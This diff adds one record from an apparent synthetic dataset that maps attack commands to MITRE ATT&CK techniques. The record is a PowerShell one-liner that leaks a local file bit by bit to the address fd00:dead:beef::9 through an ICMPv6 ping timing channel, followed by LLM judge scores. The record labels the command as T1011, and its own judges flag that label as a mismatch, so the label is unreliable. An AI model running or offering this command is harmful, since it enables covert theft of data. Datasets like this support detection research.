@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fd00:dead:beef::9'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\notes.txt'); foreach($b in $bytes){ $bits=[Convert]::ToString($b,2).PadLeft(8,'0'); foreach($bit in $bits.ToCharArray()){ Test-Connection -ComputerName $d -Count 1 -BufferSize 256 -IPv6 -Quiet | Out-Null; Start-Sleep -Milliseconds (if($bit -eq '1'){750}else{250}) } }",
+  "explanation": "Uses a timing covert channel over ICMPv6: uniform payload echos are spaced with distinct delays to represent bit values, aligning with T1011.",
+  "rationale_steps": [
+    "Convert bytes to bit strings.",
+    "Send a constant-size ICMPv6 echo per bit.",
+    "Delay intervals encode 0/1 so a receiver can reconstruct data by observing arrival timing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-1ebf45c5",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/braces, valid Test-Connection parameters, and a valid subexpression using if to produce the -Milliseconds value.",
+        "semantic_score": 1,
+        "semantic_justification": "Implements a covert timing channel over ICMPv6 (network-based), which is not exfiltration over a physical medium as described for T1011.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T09:48:22.517514Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, parentheses, and braces, proper variable assignments, valid method calls, and correct control flow syntax.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command implements a covert channel using timing between ICMPv6 packets to exfiltrate data, it doesn't align with T1011 (Exfiltration Over Physical Medium) but rather with T1048.003 (Exfiltration Over Alternative Protocol: TCP/IP).",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T09:48:25.967098Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Powershell command uses correct syntax for variable assignments, .NET method calls, loops, cmdlets, parameters, and conditional logic, with all delimiters properly balanced.",
+        "semantic_score": 1,
+        "semantic_justification": "While the command correctly implements a timing covert channel over ICMPv6 for data exfiltration, this network-based exfiltration method fundamentally misaligns with MITRE ATT&CK T1011, which explicitly describes exfiltration via physical media.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T09:48:37.465830Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 3.333,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
